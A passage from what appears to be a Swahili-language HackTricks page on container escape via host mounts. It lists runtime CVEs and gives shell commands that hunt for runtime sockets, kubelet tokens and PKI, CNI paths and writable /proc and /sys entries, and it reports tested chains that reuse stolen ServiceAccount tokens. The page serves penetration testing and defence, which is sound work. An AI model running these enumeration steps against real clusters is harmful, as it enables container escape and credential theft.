inayoshukiwa.

## CVE Zinazohusiana na Mount

Mount za host pia huhusiana na udhaifu wa runtime. Mifano muhimu ya hivi karibuni ni pamoja na:

- `CVE-2024-21626` katika `runc`, ambapo file descriptor ya directory iliyovuja ingeweza kuweka working directory kwenye filesystem ya host.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo Dockerfiles hasidi, frontends, na mtiririko wa `RUN --mount` ungeweza kurejesha ufikiaji wa faili za host, ufutaji, au ruhusa za juu wakati wa builds.
- `CVE-2024-1753` katika Buildah na mtiririko wa build wa Podman, ambapo bind mounts zilizoundwa kwa makusudi wakati wa build zingeweza kufichua `/` kwa kusoma na kuandika.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa kufungua image ingeweza kuruhusu image iliyoundwa kwa makusudi kurekebisha filesystem ya host wakati wa pull.

CVE hizi ni muhimu hapa kwa sababu zinaonyesha kuwa ushughulikiaji wa mount hauhusu tu usanidi wa operator. Runtime yenyewe pia inaweza kuleta hali za escape zinazotokana na mount.

## Ukaguzi

Tumia amri hizi kutambua kwa haraka maeneo ya mount yenye hatari kubwa zaidi:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Kinachovutia hapa:

- Root ya host, `/proc`, `/sys`, `/var`, na soketi za runtime zote ni matokeo ya kipaumbele cha juu.
- Maingizo ya proc/sys yanayoweza kuandikwa mara nyingi humaanisha kuwa mount inaonyesha vidhibiti vya kernel vya host nzima badala ya mwonekano salama wa container.
- Njia za `/var` zilizowekwa kama mount zinahitaji ukaguzi wa credentials na workload jirani, si ukaguzi wa mfumo wa faili pekee.
- Saraka za hali ya Kubelet na njia za CNI/plugin zinapaswa kupewa kipaumbele sawa na soketi za runtime kwa sababu mara nyingi ziko moja kwa moja kwenye njia ya node ya kuunda pod na kusambaza credentials.

## Hali ya Uthibitishaji wa Ndani

Minyororo ya vitendo kwenye ukurasa huu ilikaguliwa dhidi ya node ya ndani ya Linux minikube. Uthibitishaji ulirudia:

- ufikiaji wa kusoma na kuandika kupitia `hostPath` ya muda inayoweza kuandikwa
- ugunduzi wa tokeni za ServiceAccount zilizowekwa na Secrets zilizowekwa kupitia `/var/lib/kubelet/pods`
- uthibitishaji uliofanikiwa wa Kubernetes API kwa kutumia tokeni hai iliyopatikana kutoka kwenye hali hiyo ya kubelet iliyowekwa
- ugunduzi wa kusoma tu wa mfumo wa faili wa Docker `overlay2` wa workload jirani kupitia `/var` iliyowekwa
- uundaji wa container ndugu kupitia Docker API yenye host bind ya kusoma tu kupitia `docker.sock` iliyowekwa
- utekelezaji wa host uliocheleweshwa kupitia hook ya muda inayotumiwa na host
- uigaji wa CNI-wrapper uliohifadhi hoja, ingizo sanifu, na utekelezaji wa plugin asili

Node hiyo hiyo ilifichua `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, na `config.gz`, lakini haikufichua `uevent_helper`, vigeu vya EFI, maingizo ya joto, au `sched_debug`. Vichochezi vya kernel vinavyoharibu havikutekelezwa. Hii inathibitisha kuwa minyororo ya root ya host, `/var`, hali ya kubelet, soketi, na watumiaji wa host inaweza kurudiwa, ilhali mbinu za procfs/sysfs helper lazima zibaki kutegemea kernel halisi, hali ya mount, njia ya payload, na kichochezi.

## References

- [1] [Faili na Njia za Ndani Zinazotumiwa na Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Container ya cilium-agent inaweza kufikia host kupitia mount ya `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
